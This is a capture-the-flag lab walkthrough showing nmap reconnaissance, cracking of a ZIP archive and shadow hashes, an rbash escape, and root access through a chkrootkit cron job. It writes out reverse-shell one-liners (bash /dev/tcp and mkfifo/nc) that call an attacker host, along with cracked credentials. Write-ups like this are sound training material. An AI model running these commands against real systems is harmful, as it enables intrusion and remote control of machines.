---
custom_edit_url: null
---

## Reconnaissance

### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -T5 -Pn -A -p- 192.168.241.85
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 02:33 EDT
Warning: 192.168.241.85 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.241.85
Host is up (0.069s latency).
Not shown: 64145 closed tcp ports (conn-refused), 1388 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 313.86 seconds
```

There are two open ports:

| Port | Service |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

Let's visit the web page for the target.

![1](https://github.com/user-attachments/assets/00ab8e6d-f018-433c-a837-a76520277f4c?raw=1)

This `save.zip` file had also showed up in the Nmap scan.

Once we have downloaded the file, we can try to unzip it using the `unzip` utility.

```
$ unzip save.zip                     
Archive:  save.zip
[save.zip] etc/passwd password: 
```

It requires a password. Fortunately there is a way to crack ZIP passwords.

### Cracking ZIP password

Before we try to crack the password, we have to convert the ZIP file into a file format required by John the Ripper.

We can do so using the `zip2john` utility.

```
$ zip2john save.zip > save.hash
```

Now we can crack the password using John the Ripper or `john`.

```
$ john save.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
manuel           (save.zip)     
1g 0:00:00:00 DONE 2/3 (2024-08-09 13:21) 7.142g/s 541450p/s 541450c/s 541450C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now that we know that the password for the ZIP file is `manuel`, we can unzip it.

```
$ unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname  
```

&nbsp;

## Exploitation

### Hash cracking

Since we have the `shadow` file, we can crack the hashes.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)   
```

We have the following credentials

| User                             | Password |
| :------------------------------- | :------- |
| 296640a3b825115a47b68fc44501c828 | server   |

Using these credentials, we can login to the target via SSH.

### SSH login

```
$ ssh 296640a3b825115a47b68fc44501c828@192.168.241.85
296640a3b825115a47b68fc44501c828@192.168.241.85's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  9 13:35:45 2024 from 192.168.45.234
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ 
```

&nbsp;

## Post Exploitation

### Escaping restricted shell

Once we obtain a foothold on the target, we quickly realize that most commands are not allowed.

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat
-rbash: cat: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd
-rbash: cd: restricted
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /usr/bin/cat local.txt
-rbash: /usr/bin/cat: restricted: cannot specify `/' in command names
```

We can escape the restriction is we use the `-t "bash --noprofile"` option while logging in via SSH.

```
$ ssh 296640a3b825115a47b68fc44501c828@192.168.241.85 -t "bash --noprofile"
296640a3b825115a47b68fc44501c828@192.168.241.85's password: 
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
```

We can also escape the restriction by setting the PATH variable to the following.

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### local.txt

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
/usr/bin/cat local.txt
0fc44c820a32214799707c05d1fabc6a
```

### Privilege Escalation

There is an executable called `honeypot.decoy` which we can run. 

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------

```

#### Enumerating Privilege Escalation vectors using pspy

In order to find a privilege escalation vector we have to use the [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) utility.

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/tmp$ wget http://192.168.45.234:8000/pspy64
--2024-08-09 13:55:54--  http://192.168.45.234:8000/pspy64
Connecting to 192.168.45.234:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                     100%[========================================================================================================================================>]   2.96M  1.34MB/s    in 2.2s    

2024-08-09 13:55:56 (1.34 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/tmp$ chmod +x pspy64
```

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/tmp$ ./pspy64

<SNIP>

2024/08/10 00:14:01 CMD: UID=0     PID=4436   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/08/10 00:14:01 CMD: UID=0     PID=4440   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/08/10 00:14:01 CMD: UID=0     PID=4439   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/08/10 00:14:01 CMD: UID=0     PID=4443   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/08/10 00:14:01 CMD: UID=0     PID=4442   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/08/10 00:14:01 CMD: UID=0     PID=4441   | /bin/sh /root/chkrootkit-0.49/chkrootkit 

<SNIP>
```

It seems that the option we chose earlier set a Cron job. We can exploit this Cron job to gain privileged access.

#### Chkrootkit exploit

We can download the exploit from [Exploit-DB](https://www.exploit-db.com/exploits/33899).

![2](https://github.com/user-attachments/assets/4f40a2d3-eb7c-4172-9b60-bbf13356a26e?raw=1)

![3](https://github.com/user-attachments/assets/08745b10-09eb-4821-881d-347432a66a22?raw=1)

Let's follow the steps to reproduce and create a reverse shell file called `update`.

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/tmp$ touch update
```

```bash title="update"
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.234/9999 0>&1
```

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.234 9999 > /tmp/f
```

Set it's permissions as executable.

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/tmp$ chmod +x update
```

Now, we have to set up a `nc` listener and wait for the Cron job to be executed.

```
$ nc -nlvp 9999                     
listening on [any] 9999 ...
```

Next we have execute the `honeypot.decoy` file and choose to run the AV scan.

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
```

After a few seconds, we can check back on our `nc` listener.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.45.234] from (UNKNOWN) [192.168.241.85] 47976
```

### proof.txt

```
cat proof.txt
22b19a30de456b8bd19ead376f754b3d
```
